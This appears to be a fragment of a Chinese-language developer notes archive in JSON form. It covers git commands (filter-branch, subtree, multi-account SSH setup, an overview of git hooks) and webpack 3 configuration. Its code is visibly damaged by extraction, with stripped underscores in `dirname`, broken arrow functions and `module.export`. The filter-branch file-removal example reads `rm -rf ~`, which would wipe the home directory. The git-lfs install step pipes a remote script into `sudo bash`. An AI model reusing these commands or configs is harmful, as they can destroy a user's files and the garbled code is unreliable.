for-each-ref --format='delete %(refname)' refs/original | git update-ref --stdin\ngit reflog expire --expire=now --all\ngit gc --prune=now\n\nfilter-branch全局修改邮箱地址\ngit filter-branch --commit-filter '\n       if [ \"$GITAUTHOREMAIL\" = \"schacon@localhost\" ];\n       then\n               GITAUTHORNAME=\"Scott Chacon\";\n               GITAUTHOREMAIL=\"schacon@example.com\";\n               git commit-tree \"$@\";\n       else\n               git commit-tree \"$@\";\n       fi' HEAD\nname and email。 一句话不割:\ngit filter-branch -f --env-filter \"GITAUTHORNAME='Newname'; GITAUTHOREMAIL='newemail'; GITCOMMITTERNAME='Newname'; GITCOMMITTEREMAIL='newemail';\" HEAD\n\n filter-branch从每一个提交移除一个文件或目录\ngit filter-branch --tree-filter 'rm -rf ~'\ngit filter-branch -f --tree-filter 'rm -rf ~' HEAD\ngit filter-branch -f --all --tree-filter 'rm -rf ~' HEAD #作用于所有分支\n\nfilter-branch一个子目录做为新子项目\ngit filter-branch --subdirectory-filter subdir HEAD\ngit filter-branch --prune-empty --subdirectory-filter SUBFOLDER BRANCH-NAME \ngit subtree split --prefix=SUBFOLDER -b BRANCH-NAME\n\n 清理 .git 目录大小\ngit gc\n\nGit合并branch上的指定文件\ngit checkout -p dev A.h //不切换branch，把RemLan上的A.h更新到当前分支\ngit checkout dev .drone //去掉-p参数，新增 .drone.yml .drone.yml.sig 文件\n 允许空提交\ngit commit --allow-empty -m \"Initializing gh-pages branch\"\n\nlfs\nApt/deb repos: curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | sudo bash\nYum/rpm repos: curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.rpm.sh | sudo bash\nsudo apt-get install git-lfs\n\n 关键Hooks\npost-commit\npre-push\n服务端\npost-receive\n当从本地版本库完成一个推送，并且在远程服务器上所有引用都更新完毕后执行。该脚本可以用于对其他镜像版本库的更新，或向用户发送提示（直接通过服务器端的echo命令）。如上文我提到的利用Git实现生产代码的自动化部署，就可以通过这个脚本完成。\n github Emoji表情包\nhttp://www.webpagefx.com/tools/emoji-cheat-sheet/\n\ntouch .gitignore 井号开头的这行都是注释\n.md 忽略根目录下所有.md后缀的文件\n!README.md #但README.md除外\ndir #忽略根目录dir目录\ndir/ #忽略根目录下的dir/目录下的所有文件\n*/dir #忽略根目录下的dir目录及dir目录下的所有文件\n/dir 忽略所有目录下的dir目录及dir目录下的所有文件   忽略多层文件夹,git1.8.2及更高版本才支持\n\n关闭git pull 弹出的merge 信息\ngit reset --hard origin/master \n[core]\n    mergeoptions = --no-edit\ngit config --global core.mergeoptions --no-edit\n.gitignore无效解决办法\ngit rm -r --cached . #删除所有缓存\ngit checkout --track origin/develop   #\ngit submodule update --init --recursive  #ycmd\n\n添加空目录\n find . -type d -empty -exec touch {}/.gitignore \\;\n\n.git 文件太大时怎样处理\nclone的时候，可以指定深度，如下，为1即表示只克隆最近一次commit.\ngit clone --depth 1 git@github.com:/\n\nsubtree\n1、初始化子项目Subtree\n通过\ncd P1项目的路径\ngit subtree add --prefix=用来放S项目的相对路径 git地址 xxx分支\n这样的命令，把S项目（我们姑且叫他S项目）的代码下载到--prefix所指定的目录——我们姑且叫他S目录把，并在P1项目里自动产生一个commit（就是把S目录的内容提交到P1项目里）。\n对于P2项目也做同样的操作\n2、像往常一样更新代码\n大家在P1项目里各种提交commit，其中有些commit会涉及到S目录的更改，正如前面提到的，这是没任何关系的，大家也不会感受到有任何不一样。\n3、提交更改到子项目的Git服务器\n关键的地方来了：\n当维护这个S项目 Subtree 的人希望把最近这段时间对S目录的更改提交到S项目的 Git 服务器上时，他执行一段类似于这样的命令：\ncd P1项目的路径\ngit subtree push --prefix=S项目的路径 git地址 xxx分支\nGit 会遍历所有的commit，从中找出针对S目录的更改，然后把这些更改记录提交到S项目的Git服务器上\n4、更新子项目新的代码到父项目\nOK，现在S项目有大量的新代码了，P2项目也想使用这些新代码，维护P2这个Subtree的人只要执行：\ngit subtree pull --prefix=S项目的路径 git地址 xxx分支\n这样就可以将P2项目里S项目目录里的内容更新为S项目xxx分支的最新代码了。\n\n Git多账号切换\n有时候会遇到需要使用多个git账号的情况，手动切换是在过于麻烦。\n于是就有了一下的解决方案：\n首先，切换到ssh的key目录下：\ncd ~/.ssh\n然后使用ssh-keygen命令创建一个新的SSH key:\nssh-keygen -t rsa -C  \"sencond@mail.com\" -f idrsasecond\n其中idrsasecond表示保存的key的名称,可以自定义，命令执行之后会在.ssh目录里出现两个文件其中idrsasecond.pub表示公钥。后面会用到。\n由于默认情况下，每次进行SSH连接时默认发送本地钥匙（默认为~/.ssh/idrsa）。所以之前生成的idrsasecond在默认情况下是没有被用到的。\n这时就需要在~/.ssh 目录创建config文件，该文件用于配置钥匙对应的服务器信息。具体语法如下：\nHost    别名\n    HostName        主机名\n    Port            端口\n    User            用户名\n    IdentityFile    密钥文件的路径\n其中Host别名自己任意给出，能方便记忆就行。给出一个示例配置以供参考：\nDefault github user(first@mail.com)\nHost github.com\n     HostName github.com\n     User git\n     IdentityFile ~/.ssh/idrsa\n second user(second@mail.com)\nHost github-second\n     HostName github.com\n     User git\n     IdentityFile ~/.ssh/idrsasecond\n配置完成之后，在连接非默认账号需要修改一下远程库的地址，\n如本来的远程库地址为git@github:sencond/test.git\n现在就需要改为git@github-second:sencond/test.git。\n而且通过 ssh + 别名就能登录远程库\n注意：\n    切换账号的时候要修改相应的配置文件\n     git config --global user.name 用户名\n     git config --global user.email second@email.com\n    在远程端添加前面生成的idrsasecond.pub的公钥到远程库里。\n    使用对应的ssh key密码。\nEnjoy it\n################################################################################\n\n    本文由作者@PengEdy将其发表在Segmentfault上的两篇文章联合修订而成。\n\n什么是Git Hooks？\n\n话说，如同其他许多的版本控制系统一样，Git也具有在特定事件发生之前或之后执行特定脚本代码功能（从概念上类比，就与监听事件、触发器之类的东西类似）。Git Hooks就是那些在Git执行特定事件（如commit、push、receive等）后触发运行的脚本。\n\n按照Git Hooks脚本所在的位置可以分为两类：\n\n    本地Hooks，触发事件如commit、merge等。\n    服务端Hooks，触发事件如receive等。\n\nGit Hooks能做什么？\n\nGit Hooks是定制化的脚本程序，所以它实现的功能与相应的git动作相关；在实际工作中，Git Hooks还是相对比较万能的。下面仅举几个简单的例子：\n\n    pre-commit: 检查每次的commit message是否有拼写错误，或是否符合某种规范。\n    pre-receive: 统一上传到远程库的代码的编码。\n    post-receive: 每当有新的提交的时候就通知项目成员（可以使用Email或SMS等方式）。\n    post-receive: 把代码推送到生产环境。（这就是我想要做的）\n    etc...\n\n更多的功能可以按照生产环境的需求写出来。\nGit Hooks是如何工作的？\n\n每一个Git repo下都包含有.git/hoooks这个目录（没错，本地和远程都是这样），这里面就是放置Hooks的地方。你可以在这个目录下自由定制Hooks的功能，当触发一些Git行为时，相应地Hooks将被执行。\n\n这里是一个Git Hooks列表，现在如果觉得不是很明白，不用担心，以后我会继续讲：\n\n    applypatch-msg\n    pre-applypatch\n    post-applypatch\n    pre-commit\n    prepare-commit-msg\n    commit-msg\n    post-commit\n    pre-rebase\n    post-checkout\n    post-merge\n    pre-receive\n    update\n    post-receive\n    post-update\n    pre-auto-gc\n    post-rewrite\n\nimage图中是我一个本地repo的git hooks示例。\n如何开始使用Git Hooks？\n\n好了，前面啰嗦一大堆，这里才是重点。\n\n如图中所示的文件，是由本地执行的脚本语言写成的，尽管这些文件默认会是Shell Script，你完全可以给它替换成自己喜欢的Ruby，Python或者Perl。\n\n举个例子，它是这个样子的：\n\nimage\n\n关于这些脚本文件的命名，细心的读者就会发现图中的文件都是上面Git行为列表中列出的名称加上后缀.sample。没错就是这样，把那些文件的后缀去掉，或者以列表中的名字直接命名，就会把该脚本绑定到特定的Git行为上。\n\n所以说，Git Hooks的正确操作方式是：写脚本。\nGit Hooks脚本分类\n\nGit Hooks脚本可以按照运行环境分为两类：本地Hooks与服务端Hooks。\nClient Side\n\n也就是上面提到的本地hooks。 其实本地hooks还是占大多数的，可以给它们分成三类：\n\n    commit hooks\n    e-mail hooks\n    其他\n\nCommit Hooks\n\n与git commit相关的hooks一共有四个，均由git commit命令触发调用，按照一次发生的顺序分别是：\n\n    pre-commit\n    prepare-commit-msg\n    commit-msg\n    post-commit\n\n其中，pre-commit是最先触发运行的脚本。在提交一个commit之前，该hook有能力做许多工作，比如检查待提交东西的快照，以确保这份提交中没有缺少什么东西、文件名是否符合规范、是否对这份提交进行了测试、代码风格是否符合团队要求等等。 这个脚本可以通过传递--no-verify参数而禁用，如果脚本运行失败（返回非零值），git提交就会被终止。\n\nprepare-commit-msg脚本会在默认的提交信息准备完成后但编辑器尚未启动之前运行。 这个脚本的作用是用来编辑commit的默认提交说明。 该脚本有1~3个参数：包含提交说明文件的路径，commit类型（message, template, merge, squash），一个用于commit的SHA1值。这个脚本用的机会不是太多，主要是用于能自动生成commit message的情况。 该不会因为--no-verify参数而禁用，如果脚本运行失败（返回非零值），git提交就会被终止。\n\ncommit-msg包含有一个参数，用来规定提交说明文件的路径。 该脚本可以用来验证提交说明的规范性，如果作者写的提交说明不符合指定路径文件中的规范，提交就会被终止。 该脚本可以通过传递--no-verify参数而禁用，如果脚本运行失败（返回非零值），git提交就会被终止。\n\npost-commit脚本发生在整个提交过程完成之后。这个脚本不包含任何参数，也不会影响commit的运行结果，可以用于发送new commit通知。\n\n需要注意到，这几个脚本并不会通过clone传到项目中，而且既然是完全运行在本地，那就无法完全保证验证能起到作用（可以随便修改），但为了保证一些项目的可靠性，还需要开发者们自觉遵守这些规则。\nE-mail Hooks\n\n与git am相关的脚本由三个，均由git am触发运行，按顺序依次是：\n\n    applypatch-msg\n    pre-applypatch\n    post-applypaych\n\n如果在工作流中用不到这个命令，那也就无所谓了。不过，如果要用git format-patch命令通过Email提交补丁，这部分内容还是比较有用的。\n\napplypatch-msg脚本最先被触发，它包含一个参数，用来规定提交说明文件的路径。该脚本可以修改文件中保存的提交说明，以便规范提交说明以符合项目标准。如果提交说明不符合规定的标准，脚本返回非零值，git终止提交。\n\n说明一点，这个脚本看上去和commit-msg作用几乎一样。没错，默认情况下该脚本是这样写的：\n\n也就是说，该脚本会调用commit-msg并执行。实际上，这一切都是可修改的。\n\npre-applypatch会在补丁应用后但尚未提交前运行。这个脚本没有参数，可以用于对应用补丁后的工作区进行测试，或对git tree进行检查。如果不能通过测试或检查，脚本返回非零值，git终止提交。 同样需要注意，git提供的此默认脚本中只是简单调用了pre-commit，因此在实际工作中需要视情况修改。\n\npost-applypatch脚本会在补丁应用并提交之后运行，它不包含参数，也不会影响git am的运行结果。该脚本可以用来向工作组成员或补丁作者发送通知。\n其他Hooks\n\n    pre-rebase\n\n由git rebase命令调用，运行在rebase执行之前，可以用来阻止任何已发发生过的提交参与变基（字面意思，找不到合适的词汇了）。默认的pre-rebase确实是这么做的，不过脚本中的next是根据Git项目自身而写的分支名，在使用过程中应该将其改成自己的稳定分支名称。\n\n    post-checkout\n\n由git checkout命令调用，在完成工作区更新之后执行。该脚本由三个参数：之前HEAD指向的引用，新的HEAD指向的引用，一个用于标识此次检出是否是分支检出的值（0表示文件检出，1表示分支检出）。\n\n也可以被git clone触发调用，除非在克隆时使用参数--no-checkout。在由clone调用执行时，三个参数分别为null, 1, 1。\n\n这个脚本可以用于为自己的项目设置合适的工作区，比如自动生成文档、移动一些大型二进制文件等，也可以用于检查版本库的有效性。\n\n    post-merge\n\n由git merge调用，在merge成功后执行。该脚本有一个参数，标识合并是否为压缩合并。该脚本可以用于对一些Git无法记录的数据的恢复，比如文件权限、属主、ACL等。\nServer Side\n\n除了本地执行的Hooks脚本之外，还有一些放在Git Server上的Hooks脚本，作为管理员，可以利用这些服务端的脚本来强制确保项目的任何规范。这些运行在服务端的脚本，会在push命令发生的前后执行。pre系列的脚本可以在任何时候返回非零值来终止某次push，并向push方返回一个错误说明。\n\n这里简单介绍这几个脚本：\n\n    pre-receive\n\n由服务器端的git receive-pack命令调用，当从本地版本库完成一个推送之后，远端服务器开始批量更新之前，该脚本被触发执行。该脚本会从标准输入中读入一连串push过来的引用，如果这里面存在任何非零值，这批更新将不会被服务器接受。可以利用这个脚本来检查推送过来的提交是否合法。\n\n    post-receive\n\n由服务器端的gir receive-pack命令调用，当从本地版本库完成一个推送，并且在远程服务器上所有引用都更新完毕后执行。该脚本可以用于对其他镜像版本库的更新，或向用户发送提示（直接通过服务器端的echo命令）。如上文我提到的利用Git实现生产代码的自动化部署，就可以通过这个脚本完成。\n\n    update 这是一个强大的hook脚本。它和pre-recieve有些类似，只是它会为推送过来的更新中涉及到的每一个分支都做一次检查，而后者则至始至终只有一次检查。另外，它不是从标准输入中读取数据，而是包含三个参数：\n        要更新的引用或分支的名称\n        引用中保存的旧对象名称（SHA1）\n        将要保存到引用中的新对象名称(SHA1)\n\n如果检查到返回非零值，之后返回非零值的引用会被拒绝，其他正常的引用更新都会被接受。除此之外，该脚本还可以用来防止引用被强制更新，因为它可以通过这些参数来检查新旧引用对象中是否存在继承关系，从而提供更细致的推送授权。\n\n在Gitolite中，该脚本有更强大的应用实例。\nGit Hooks项目介绍\n\n    node-hooks: 一个命令行下的Git Hooks管理工具\n    git-hooks: 一个全面的Git Hooks管理工具\n    Git::Hooks: 一个实现Git Hooks的框架\n    etc...","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-11-09 webpack","title":"wepack3 详解","text":"webpack3中文文档  \nFis3构建迁移Webpack之路  \n大公司里怎样开发和部署前端代码  \nawesome-webpack-cn  \nwebpack进阶之插件篇  \nwebpack飞行手册 推荐  \n\nentry：入口，定义要打包的文件\noutput：出口，定义打包输出的文件；包括路径，文件名，还可能有运行时的访问路径（publicPath）参数\nmodule: webpack将所有资源都看做是模块,而模块就需要加载器；\n  loaders: Webpack 本身只能处理 JavaScript 模块，如果要处理其他类型的文件，就需要使用 loader 进行转换。\nplugins：定义以下额外的插件\nresolve：定义能够被打包的文件，文件后缀名\n    extensions: ['', '.js', '.es6']\n\nwenbpack 安装失败的原因\n\n1、网络问题    cnpm\n2、权限问题\n3、node 版本问题\n\n webpack版本问题修改\n\n新项目\n   直接删除nodemodules 重新安装 npm install --save-dev webpack\n旧项目\n   修改package.json中的版本号   删除nodemodules   重新  npm install\n\n学习步骤\n\n1、配置文件webpack.config.js\n2、entery选项（入口配置）\n3、output选项（出口配置）\n4、多入口、多出口配置\n\n 基本结构\n\nconst path=require('path');\nmodule.export={\n    entry:{\n        entry:'文件路径'\n    },       入口配置\n    output:{\n        path：path.resolve(dirname,'dist'),  node语法相对路径\n        filename:'[name].js'    //压缩后的文件名\n    },      出口配置\n    module:{},      解读css  图片转换压缩\n    plugins:[]      插件\n    devServer:{}    配置服务\n}\n\nwebpack配置服务、热更新技术\n\ndevServer:{\n    contentBase:path.resolve(dirname,'dist'),\n    host:'192.168.199.106',           //服务器地址\n    compress:true,                    //服务器是否压缩\n    port:1717                        //服务器端口\n}\n\nnpm install webpack-dev-server --save-dev\n修改package.json\n\"script\":{\n    \"server\":\"webpack-dev-server\"\n}\n  起服务  npm run server\n\n  webpack3.6以上的热更新\n\n css打包\n\nstyle-loader      //处理css中URL\ncss-loader        //对标签处理\n\nmodule:{\n        rules:[\n            {\n                test:/\\.css$/,    //通过正则的方式找到处理的扩展\n                //use:['style-loader','css-loader]\n                //loader\n                //use:[{\n                    loader:'style-loader'\n                    },{\n                        loader:'css-loader'\n                }]\n            }\n        ]\n    },\n\njs打包\n\n  引入插件 uglify\n\nconst uglify = require('uglifyjs-webpack-plugin');\n\nplugins:[\n   new uglify()\n]\n\n html打包\n\n安装并引入插件  html-webpack-plugin\nconst htmlPlugin = require('html-webpack-plugin');\nplugins:[\n    new  htmlPlugin({\n        minify:{\n            removeAttributeQuotes:true\n        },\n        hash:true,\n        template:'./src/index.html'\n    })\n]\n\nminify：是对html文件进行压缩，removeAttrubuteQuotes是却掉属性的双引号。\nhash：为了开发中js有缓存效果，所以加入hash，这样可以有效避免缓存JS。\ntemplate：是要打包的html模版路径和文件名称。\n\ncss图片路径问题\n\nmodule:[{\n    rules{\n        test:/\\.(png|jpg|gif)/,\n        use:[{\n            loader:'url-loader',\n            options:{\n                limit:50000\n            }\n        }]\n    }\n}]\n\ntest:/\\.(png|jpg|gif)/是匹配图片文件后缀名称。\nuse：是指定使用的loader和loader的配置参数。\nlimit：是把小于500000B的文件打成Base64的格式，写入JS。\n\n  css分离\n\n安装插件  extract-text-webpack-plugin\n引入插件\n在插件中声明\n修改处理css\nrules:[\n    {\n        test:/\\.css$/,\n        use:extractTextPlugin.extract({\n            fallback:'style-loader',\n            use:'css-loader'\n        })\n    }]\n\n处理html中的图片\n\n安装插件  html-withimg-loader\n配置插件  \n  {\n    test:/\\.(html|htm)$/i,\n    use:['html-withimg-loader']\n}\n\n 自动补全css前缀\n\n安装插件  postcss-loader   autoprefixer\n\n创建postcss.config.js\n  module.exports={\n    plugins:[\n        require('auotprefixer')\n    ]\n}\n\n编写loader\n  {\n    test: /\\.css$/,\n    use: extractTextPlugin.extract({\n        fallback: 'style-loader',\n        use: [\n            { loader: 'css-loader', options: { importLoaders: 1 } },\n            'postcss-loader'\n        ]\n    })\n\n}\n\ngit@github.com:heavenswen/webpack-page.git\n//编译状态\nconst Env = process.env.NODEENV === 'production'\nconst { join, resolve } = require('path')\nconst webpack = require('webpack')\nconst glob = require('glob')\n// const ImageminPlugin = require('imagemin-webpack-plugin').default;\nconst HtmlWebpackPlugin = require('html-webpack-plugin')\nconst ExtractTextPlugin = require('extract-text-webpack-plugin')\nconst CommonsChunkPlugin = require('webpack/lib/optimize/CommonsChunkPlugin')\nconst LiveReloadPlugin = require('webpack-livereload-plugin')\nconst ROOT = process.cwd();  // 根目录\n// 通过允许您并行转换多个文件， HappyPack使Webpack构建更快。\nconst HappyPack = require('happypack');\nconst HappyThreadPool = HappyPack.ThreadPool({ size: (Env ? 10 : 4) });\nconst release = Env ? '/' : '/'//域名文件夹\n//页面对应路口\nconst entries = {}\n//入口对象集\nconst chunks = []\n//页面list\nconst pagesList = []\n//logo\nconst favicon = \"./src/assets/img/logo.png\"\n// 页面模版\nconst entryHtml = []\n\n//页面模版\nglob.sync(\"./src/pages/*/.{ejs,html}\").forEach(path =  {\n  //HtmlWebpackPlugin 不支持 .html 编译 ejs 用.ejs\n  let filename = path.split('./src/pages/')[1]\n\n  //入口js文件名\n  let chunk = path.split('./src/pages/')[1].split(/\\.(ejs|html)/)[0]\n  //设置产出路径\n  chunk = 'js/' + chunk\n  // 入口js路径\n  let js = path\n\n  //js路径\n  js = js.replace(/\\/pages/ig, '/entry');\n  js = js.replace(/\\.(ejs|html)/gi, '.js');\n  entries[chunk] = js\n  //入口js名称名称\n  chunks.push(chunk)\n\n  filename = filename.replace(/\\.ejs/ig, '.html')\n  //获得所有页面\n  pagesList.push(filename)\n  let htmlConf = {\n    filename: filename,//文件名\n    //模版位置\n    template: path,\n    inject: 'body',\n    favicon: favicon,\n    hash: Env,\n    env: Env,//HtmlWebpackPlugin.options.env 非打包时的处理\n    list: pagesList,//页面地址\n    chunks: ['vendors', chunk] //chunk\n  }\n\n  //保存配置\n  entryHtml.push(htmlConf)\n\n})\n\nconst config = {\n  entry: entries,\n  output: {\n    path: resolve(dirname, './dist'),\n    filename: '[name].js',\n    publicPath: release\n  },\n  resolve: {\n    //路径检索\n    extensions: ['.js', '.vue'],\n    alias: {\n      //资源\n      assets: join(dirname, '/src/assets'),\n      //组件\n      components: join(dirname, '/src/components'),\n      //视图\n      views: join(dirname, '/src/views'),\n      root: join(dirname, 'nodemodules')\n\n    }\n  },\n  module: {\n    //忽略以下js\n    noParse: /nodemodules\\/(jquey|zepto|moment|chart\\.js)/,\n    rules: [\n      {\n        test: /\\.vue$/,\n        use: 'vue-loader'\n      },\n      {\n        test: /\\.js$/,\n        use: [{\n          loader: 'babel-loader?id=js',\n          options: {\n            //es6\n            presets: ['es2015']\n          }\n        }],\n        exclude: /nodemodules/\n      },\n      {\n        //编译sass\n        test: /\\.(scss|sass)$/,\n        use: ExtractTextPlugin.extract({\n          fallback: 'style-loader?id=style',\n          use: [{\n            loader: 'css-loader?id=style',\n            options: {\n              //压缩css\n              minimize: Env\n            }\n          }, 'postcss-loader?id=style', 'sass-loader?id=style'],\n        })\n\n      },\n      {\n        test: /\\.css$/,\n        use: ExtractTextPlugin.extract({\n          fallback: 'style-loader?id=style',\n          use: [{\n            loader: 'css-loader?id=style',\n            options: {\n              //压缩css\n              minimize: Env\n            }\n          }, 'postcss-loader?id=style'],\n        })\n      },\n\n      {\n        //修改html img路径\n        test: /\\.html$/,\n        use: [{\n          loader: 'html-loader',\n          options: {\n            root: resolve(_dirname, 'src'),\n            attrs: ['img:src', 'img:data-src', 'img:data-background', 'link:href']\n          }\n        }]\n      },\n      {\n        test: /\\.(png|jpg|jpeg|gif|svg|svgz)(\\?.+)?$/,\n        exclude: /favicon\\.(png|ico)$/,//除外\n        loaders: [\n          'url-loader?limit=1000\u0026outputPath=assets/img/\u0026name=[name].[ext]?[hash]',\n          {\n            //图片压缩\n            loader: 'image-webpack-loader',\n            options: {\n              gifsicle: {\n                interlaced: false,\n              },\n              optipng: {\n                optimizationLevel: 1,\n              },\n              pngquant: {\n                quality: '65-90',\n                speed: 4\n              },\n              mozjpeg: {\n                progressive: true,\n                quality: 65\n              }\n            }\n          }\n        ]\n      },\n      {\n        //文字资源\n        test: /\\.(eot|ttf|woff|woff2)(\\?.+)?$/,\n        use: [{\n          loader: 'url-loader',\n          options: {\n            limit: 1000,\n            name: \"[name].[ext]?[hash]\",\n            outputPath: \"assets/fonts/\",//产出目录\n          }\n        }]\n      },\n      {\n        //资源\n        test: /\\.(apk|docx|doc|exe)(\\?.+)?$/,\n        use: [{\n          loader: 'file-loader',\n          options: {\n            name: \"[name].[ext]?[hash]\",\n            outputPath: \"assets/file/\",//产出目录\n          }\n        }]\n      }\n    ]\n  },\n  plugins: [\n    //会跟 webpack-dev-server 冲突，导致js修改时找不到修改对象\n    // new LiveReloadPlugin({\n    // }),\n    new HappyPack({\n      id: 'js',\n      // @see https://github.com/amireh/happypack\n      threadPool: HappyThreadPool,\n      loaders: ['babel-loader']\n    }),\n    new HappyPack({\n      id: 'styles',\n      threadPool: HappyThreadPool,\n      loaders: ['style-loader', 'css-loader', 'postcss-loader', 'sass-loader']\n    }),\n    //获取公用模块生成js\n    new CommonsChunkPlugin({\n      name: 'vendors',\n      filename: 'assets/js/vendors.js?[hash]',\n      chunks: chunks,\n      minChunks: chunks.length\n    }),\n    //提取公用模块生成css\n    new ExtractTextPlugin({\n      filename: (getPath) =  {\n        //获得地址\n        let name = getPath('[name]')\n\n        if (!name.match(/vendors/ig)) {\n          let arr = name.split('/')\n          name = arr[arr.length - 1]//获得文件名\n        }\n        return 'assets/css/' + name + '.css';\n      },\n      allChunks: true\n    }),\n    //webpack3.0\n    new webpack.optimize.ModuleConcatenationPlugin()\n  ],\n  devServer: {\n    contentBase: [\n      join(ROOT, 'src/')\n    ],\n    port: 8010,\n    //启动路由功能\n    //historyApiFallback: false,\n    // noInfo: true,\n    hot: false,\n    //真实地址 可以用局域访问\n    disableHostCheck: true,\n    //允许其他电脑访问\n    host: '0.0.0.0',\n  },\n  devtool: '#eval-source-map'\n}\n\n//页面模版\nentryHtml.forEach(function (v) {\n  config.plugins.push(new HtmlWebpackPlugin(v));\n});\n\nmodule.exports = config\n\nif (process.env.NODEENV === 'production') {\n  module.exports.devtool = '#source-map'\n  // http://vue-loader.vuejs.org/en/workflow/production.html\n  module.exports.plugins = (module.exports.plugins || []).concat([\n    new webpack.DefinePlugin({\n      'process.env': {\n        NODEENV: '\"production\"'\n      }\n    }),\n    //压缩单元\n    new webpack.optimize.UglifyJsPlugin({\n      // 最紧凑的输出\n      beautify: false,\n      // 删除所有的注释\n      comments: false,\n      compress: {\n        // 在UglifyJs删除没有用到的代码时不输出警告  \n        warnings: false,\n        // 删除所有的 console 语句\n        // 还可以兼容ie浏览器\n        dropconsole: true,\n        // 内嵌定义了但是只用到一次的变量\n        collapsevars: true,\n        // 提取出出现多次但是没有定义成变量去引用的静态值\n        reducevars: true,\n      }\n    }),\n\n  ])\n}\nvar path = require('path');\nvar fs = require('fs');\nvar webpack = require('webpack');\nvar HtmlWebpackPlugin = require('html-webpack-plugin');\nvar ExtractTextPlugin = require('extract-text-webpack-plugin');\nvar FriendlyErrorsWebpackPlugin = require('friendly-errors-webpack-plugin');\n\nconsole.log('NODEENV',process.env.NODEENV);\n\nconst extractCSS = new ExtractTextPlugin('css/[name]-one.css');\nconst extractLESS = new ExtractTextPlugin('css/[name]-two.css');\nconst extractSASS = new ExtractTextPlugin('css/[name]-three.css');\n\nvar config = {\n    entry: {\n        main: [\n            // 'babel-polyfill',\n            'webpack-hot-middleware/client?path=/_webpackhmr\u0026timeout=20000\u0026reload=true',\n            'webpack/hot/dev-server',\n            path.resolve(dirname, 'src/main.js'),\n            path.resolve(dirname, 'src/index.js')\n        ],\n        verdor: [\n            path.resolve(dirname, 'src/verdor/verdor.js'),\n        ]\n    },\n    // entry: path.resolve(filename, '../src/main.js'),\n    output: {\n        path: path.resolve(_filename, '../dist'),\n        publicPath: '/',\n        filename: '[name].[hash:8].bundle.js',\n        // webpack 允许你根据文件内容生成哈希值，只要用 [chunkhash] 替换 [hash] 就可以了\n        // 不要在开发环境下使用 [chunkhash]，因为这会增加编译时间。将开发和生产模式的配置分开，并在开发模式中使用 [name].js 的文件名， 在生产模式中使用 [name].[chunkhash].js 文件名。\n        //    publicPath: '/',\n        //    chunkFilename: '[id].[chunkhash].js'\n    },\n    // 生成.map文件\n    // devtool: 'source-map',\n    module: {\n        rules: [\n            // 加载JSON文件 使用json-loader webpack1\n            // wenpack2 + ,json-loader 不再需要手动添加\n            // [官方: 是为了消除 webpack、 node.js 和 browserify 之间的环境差异。 https://github.com/webpack/webpack/issues/3363]\n            // {\n            //     test: /\\.json$/,\n            //     use: 'json-loader'\n            // },\n\n            // 处理 .json5结尾的文件\n            {\n                test: /\\.json5$/,\n                use: 'json5-loader'\n            },\n            // {\n            //     test: /\\.css$/,\n            //     // 使用①生成的css文件 插入到html中\n            //     // use: [ 'style-loader', 'css-loader' ]\n            //     // 使用②ExtractTextPlugin 生成style.css文件\n            //     // 在主入口文件中import\n            //     use: ExtractCSS.extract([\n            //         'css-loader',\n            //         // 'px2rem2-loader',\n            //         'postcss-loader',\n            //     ]),\n            // }\n\n            // 使用postcss方式， css 插入到DOM形式 ， 支持热更新\n            // {\n            //     test: /\\.css$/,\n            //     use: [ 'style-loader', 'css-loader',  'postcss-loader' ]\n            // },\n            {\n                test: /\\.less$/,\n                use: extractLESS.extract({\n                    fallback: ['style-loader'],\n                    use: [\n                        'css-loader',\n                        'postcss-loader',\n                        'less-loader'\n                    ]\n                })\n            },\n            {\n                test: /\\.scss$/,\n                use: extractSASS.extract({\n                    fallback: ['style-loader'],\n                    use: [\n                        'css-loader',\n                        'postcss-loader',\n                        'sass-loader'\n                    ]\n                })\n            },\n            // ExtractTextPlugin 提取了样式出来， 官方说No Hot Module Replacement。\n            // https://github.com/webpack-contrib/extract-text-webpack-plugin/blob/webpack-1/README.md\n            {\n                test: /\\.css$/,\n                use: extractCSS.extract({\n                    fallback: ['style-loader'],\n                    use: [\n                        'css-loader',\n                        'postcss-loader'\n                    ]\n                })\n            },\n            {\n                test: /\\.js(x)$/,\n                exclude: /nodemodules/,\n                loader: 'babel-loader'\n            },\n            {\n                test: /\\.(png|jpe?g|gif|svg)(\\?.)?$/,\n                loader: 'url-loader',\n                options: {\n                    limit: 8000,\n                    name: 'image/[name].[hash:7].[ext]'\n                }\n            },\n            {\n                test: /\\.(woff2?|eot|ttf|otf)(\\?.)?$/,\n                loader: 'url-loader',\n                options: {\n                    limit: 8000,\n                    name: 'font/[name].[hash:7].[ext]'\n                }\n            },\n            // 手写一个简单的webpack loader\n            // 处理 .huangyb 后缀的文件\n            {\n                test: /\\.huangyb$/,\n                loader: 'huangyb-loader'\n            }\n        ]\n    },\n    plugins: [\n        // 生成html文件，里面的JS文件 src 地址自动添加hash\n        new HtmlWebpackPlugin({\n            title: 'huangyb',\n            favicon: './src/image/logoNew.gif',\n            filename: 'index.html',\n            minify:{\n                removeComments: true, // 删除注释\n                collapseWhitespace: true // 删除空格\n            }\n        }),\n        // CSS生成单独的文件\n        // new ExtractTextPlugin({\n        //     filename: 'css/name.css',\n        //     allChunks: true,\n        //     disable: false\n        // })\n\n        extractCSS,\n        extractLESS,\n        extractSASS,\n\n        // 用来跳过编译时出错的代码并记录，使编译后运行时的包不会发生错误\n        //  webpack3 NoEmitOnErrorsPlugin 已经 取代webpack 2 的 NoErrorsPlugin\n        new webpack.NoEmitOnErrorsPlugin(),\n        new FriendlyErrorsWebpackPlugin(), // 终端显示\n\n        new webpack.optimize.CommonsChunkPlugin({ // 提取公用JS代码插件\n            names: ['vendor'],\n            // ( 公共chunk(commnons chunk) 的名称)\n            filename: 'commons.js',\n            // ( 公共chunk 的文件名)\n            minChunks: 3\n            // (模块必须被3个 入口chunk 共享)\n            // CommonsChunkPlugin 可以通过传参minChunks来控制你希望重复出现几次的module 被提取出来打包。\n            // 也就是说你自己可以控制当一个模块被引入几次可以被打包到共用的chunk中，还可以规定如果这个公共模块小于一个值 minSize，\n            // 就不被提取出来这些都可以帮助你控制你想要的粒度。当你改的不是公共模块的代码，理论上webpack 打包的时候本来就不会影响其他代码。\n            // chunks: ['pageA', 'pageB'],\n            // (只使用这些 入口chunk)\n        }),\n\n        // OccurrenceOrderPlugin 现在默认启用，并已重命名（在 webpack 1 中为 OccurenceOrderPlugin）。 因此，请确保从您的配置中删除该插件：\n        // OccurrenceOrderPlugin is now on by default\n        // new 